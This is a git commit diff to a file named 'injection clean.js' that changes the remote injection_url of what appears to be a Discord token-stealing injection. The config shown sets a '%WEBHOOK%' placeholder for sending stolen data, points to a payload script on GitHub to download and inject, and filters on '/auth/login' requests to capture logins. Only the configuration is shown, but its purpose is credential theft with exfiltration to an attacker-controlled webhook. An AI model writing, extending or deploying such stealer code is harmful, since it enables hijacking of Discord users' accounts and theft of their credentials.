0e60ed3630a21da039abea942fe50921a49568ef
fl4q <123214359+0xFl4q@users.noreply.github.com>
2024-03-13 14:31:39 +0100

    Update injection clean.js

--- injection clean.js
+++ injection clean.js
@@ -12,7 +12,7 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
+    injection_url: "https://github.com/0xFl4q/injection/blob/main/injection.js",
     filters: {
         urls: [
             '/auth/login',
